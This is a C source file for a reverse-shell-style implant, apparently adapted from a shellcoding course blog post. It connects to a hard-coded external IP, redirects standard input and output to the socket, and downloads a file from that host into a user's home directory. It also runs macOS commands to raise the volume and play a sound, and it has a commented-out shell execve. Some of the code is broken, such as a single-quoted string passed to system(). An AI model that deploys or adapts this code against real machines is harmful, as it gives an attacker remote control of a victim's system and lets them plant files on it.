/* Original code taken from https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/
 * Modifications to connect to specific machine
 socat TCP4-LISTEN:15213 STDOUT
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include <errno.h>

#define PORT_NUMBER 15213
#define SERVER_ADDRESS "54.82.172.247"
#define FILENAME "/home/toc/foo.c"

int main()
{
	int sockfd;
	char buf[4];
	int result;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(PORT_NUMBER);
	inet_aton(SERVER_ADDRESS, &server.sin_addr.s_addr);
	bzero(&server.sin_zero, 8);

	char *const argv[] = {"/usr/bin/sh", NULL};
	char *const envp[] = {NULL};

	// create a socket
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	// initiate a connection on a socket, on success 0 is returned
	printf("%d", connect(sockfd, (struct sockaddr *)&server, sizeof(server)));
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	int pid = fork();
	if (pid == 0)
	{
		//   write(sockfd, "PIN:", 4);
		//   read(sockfd, &buf, 4);

		//   result = strncmp("1234", buf, 4);
		//   if (result != 0) {
		//     return 0;
		//   }

		int downloadFile = fork();
		if (downloadFile == -1) {
			perror("fork");
			exit(EXIT_FAILURE);
		}
		if (downloadFile == 0) {
			download();
			exit(EXIT_SUCCESS);
		}
		else {
			int status;
        	waitpid(downloadFile, &status, 0);

			if (WIFEXITED(status) != 0) {
				printf("Download process exited with status %d\n", WEXITSTATUS(status));
        	}

			// system("curl --output sound.wav https://www.wavsource.com/snds_2020-10-01_3728627494378403/sfx/ahem_x.wav");

			system('osascript -e "set Volume 10"');

			system("afplay sound.wav");

			// execve("/bin/sh", argv, envp);
		}

	}

	return 0;
}

int download()
{
	int client_socket;
	ssize_t len;
	struct sockaddr_in remote_addr;
	char buffer[BUFSIZ];
	int file_size;
	FILE *received_file;
	int remain_data = 0;

	/* Zeroing remote_addr struct */
	memset(&remote_addr, 0, sizeof(remote_addr));

	/* Construct remote_addr struct */
	remote_addr.sin_family = AF_INET;
	inet_pton(AF_INET, SERVER_ADDRESS, &(remote_addr.sin_addr));
	remote_addr.sin_port = htons(PORT_NUMBER);

	/* Create client socket */
	client_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (client_socket == -1)
	{
		fprintf(stderr, "Error creating socket --> %s\n", strerror(errno));

		exit(EXIT_FAILURE);
	}

	/* Connect to the server */
	if (connect(client_socket, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) == -1)
	{
		fprintf(stderr, "Error on connect --> %s\n", strerror(errno));

		exit(EXIT_FAILURE);
	}

	/* Receiving file size */
	recv(client_socket, buffer, BUFSIZ, 0);
	file_size = atoi(buffer);
	// fprintf(stdout, "\nFile size : %d\n", file_size);

	received_file = fopen(FILENAME, "w");
	if (received_file == NULL)
	{
		fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));

		exit(EXIT_FAILURE);
	}

	remain_data = file_size;

	while ((remain_data > 0) && ((len = recv(client_socket, buffer, BUFSIZ, 0)) > 0))
	{
		fwrite(buffer, sizeof(char), len, received_file);
		remain_data -= len;
		fprintf(stdout, "Receive %d bytes and we hope :- %d bytes\n", len, remain_data);
	}
	fclose(received_file);

	close(client_socket);

	return 0;
}